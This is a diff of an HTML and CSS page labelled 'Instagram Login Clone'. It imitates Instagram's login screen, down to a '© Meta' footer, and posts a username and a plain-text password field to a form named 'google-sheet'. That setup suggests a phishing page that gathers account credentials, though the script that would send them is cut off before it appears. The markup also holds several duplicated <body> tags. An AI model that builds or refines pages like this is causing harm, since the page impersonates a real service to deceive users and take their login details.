@@ -6,153 +6,161 @@
   <title>Instagram Login Clone</title>
   <style>
     * {
-      box-sizing: border-box;
-    }
+  box-sizing: border-box;
+}
 
-    body {
-      margin: 0;
-      padding: 0;
-      font-family: sans-serif;
-      background-color: white;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      height: 100vh;
-    }
+body {
+  margin: 0;
+  padding: 0;
+  font-family: sans-serif;
+  background-color: white;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  min-height: 100vh;
+  justify-content: space-between; /* This pushes bottom section to the bottom */
+}
 
-    .english {
-      font-size: 0.9rem;
-      color: rgb(92, 90, 90);
-      margin-top: 25px;
-    }
+.bottom-section {
+  text-align: center;
+  width: 100%;
+  padding: 20px 0;
+  margin-top: auto; /* Ensures it sticks to the bottom */
+}
 
-    .container {
-      padding: 20px;
-      text-align: center;
-      flex: 1;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      position: relative;
-    }
 
-    .logo {
-      position: absolute;
-      top: 40px;
-      right: 114px;
-      height: 14vh;
-      width: 47vw;
-      margin-bottom: 75px;
-    }
+.english {
+  font-size: 0.9rem;
+  color: rgb(92, 90, 90);
+  margin-top: 25px;
+}
 
-    input[type="text"],
-    input[type="password"] {
-      width: 85vw;
-      height: 7vh;
-      padding: 12px;
-      margin: 6px 9px;
-      border: 1px solid #b3b3b3;
-      border-radius: 9px;
-      font-size: 1rem;
-      background-color: white;
-    }
+.logo {
+  width: 50%;
+  max-width: 300px;
+  height: auto;
+  margin: 20px auto 10px;
+}
+/* make the container stretch further on large screens */
+.container {
+  width: 90%;
+  max-width: 600px;       /* ↑ bump this up from 400px */
+  padding: 20px;
+  text-align: center;
+  margin: 0 auto;
+}
 
-    input:-webkit-autofill {
-      box-shadow: 0 0 0 30px white inset !important;
-      -webkit-text-fill-color: #000 !important;
-    }
+/* let the inputs fill the container width */
+input[type="text"],
+input[type="password"] {
+  width: 100%;            /* ↑ change from 90% to 100% */
+          /* remove any old max if present */
+  height: 40px;
+  padding: 10px;
+  margin:4px 0;
+  border: 1px solid #b3b3b3;
+  border-radius: 9px;
+  font-size: 1rem;
+}
 
-    .login-btn {
-      width: 100%;
-      padding: 12px;
-      margin-top: 10px;
-      background-color: #3897f0;
-      border: none;
-      border-radius: 23px;
-      color: white;
-      font-weight: bold;
-      font-size: 16px;
-      cursor: pointer;
-      position: relative;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 48px;
-    }
 
-    .spinner {
-      border: 3px solid #fff;
-      border-top: 3px solid transparent;
-      border-radius: 50%;
-      width: 16px;
-      height: 16px;
-      animation: spin 1s linear infinite;
-      margin-left: 10px;
-      display: none;
-    }
+input:-webkit-autofill {
+  box-shadow: 0 0 0 30px white inset !important;
+  -webkit-text-fill-color: #000 !important;
+}
 
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
+.login-btn {
+  width: 100%;
+  padding: 12px;
+  margin-top: 10px;
+  background-color: #3897f0;
+  border: none;
+  border-radius: 23px;
+  color: white;
+  font-weight: bold;
+  font-size: 16px;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  height: 48px;
+}
 
-    .link {
-      color: #040404;
-      margin: 15px 0;
-      font-size: 16px;
-      display: block;
-      text-decoration: none;
-    }
+.spinner {
+  border: 3px solid #fff;
+  border-top: 3px solid transparent;
+  border-radius: 50%;
+  width: 16px;
+  height: 16px;
+  animation: spin 1s linear infinite;
+  margin-left: 10px;
+  display: none;
+}
 
-    .bottom-section {
-      width: 100%;
-      text-align: center;
-      padding: 20px 0;
-    }
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
 
-    .create-account {
-      border: 1px solid #3897f0;
-      padding: 10px 20px;
-      border-radius: 30px;
-      color: #3897f0;
-      width: 95vw;
-      text-decoration: none;
-      font-weight: bolder;
-      display: inline-block;
-      margin-bottom: 10px;
-    }
+.link {
+  color: #040404;
+  margin: 15px 0;
+  font-size: 16px;
+  display: block;
+  text-decoration: none;
+}
 
-    footer {
-      font-size: 16px;
-      color: gray;
-    }
+
+.create-account {
+  border: 1px solid #3897f0;
+  padding: 10px 20px;
+  border-radius: 30px;
+  color: #3897f0;
+  width: 90%;
+  max-width: 400px;
+  text-decoration: none;
+  font-weight: bold;
+  display: inline-block;
+  margin-bottom: 10px;
+}
+
+footer {
+  font-size: 14px;
+  color: gray;
+}
+
     
   </style>
 </head>
 <body>
-  <p class="english">English (US)</p>
-
-  <div class="container">
+  <body>
+ <body>
+  <body>
+    <p class="english">English (US)</p>
+  
     <img src="instalogo.jpeg" alt="Instagram Logo" class="logo" />
-
-    <form method="POST" name="google-sheet" id="loginForm" name="google-sheet">
-
-      <input type="text" placeholder="Username, email or mobile number" id="username" name="username" />
-      <input type="text" placeholder="Password" id="password" name="password" autocomplete="new-password" />
-    
-
-    <button type="submit" class="login-btn" id="loginBtn" name="submit" disabled>
-      Log in
-      <div class="spinner" id="spinner"></div>
-    </button>
-    
-    <a href="#" class="link">Forgot password?</a>
-  </div>
-
-  <div class="bottom-section">
-    <a href="#" class="create-account">Create new account</a>
-    <footer>© Meta</footer>
-  </div>
+  
+    <div class="container">
+      <form method="POST" name="google-sheet" id="loginForm">
+        <input type="text" placeholder="Username, email or mobile number" id="username" name="username" />
+        <input type="text" placeholder="Password" id="password" name="password" autocomplete="new-password" />
+  
+        <button type="submit" class="login-btn" id="loginBtn" name="submit" disabled>
+          Log in
+          <div class="spinner" id="spinner"></div>
+        </button>
+  
+        <a href="#" class="link">Forgot password?</a>
+      </form>
+    </div>
+  
+    <!-- This stays always at the bottom -->
+    <div class="bottom-section">
+      <a href="#" class="create-account">Create new account</a>
+      <footer>© Meta</footer>
+    </div>
+  </body>
+  
 
   <script>
     const usernameInput = document.getElementById('username');
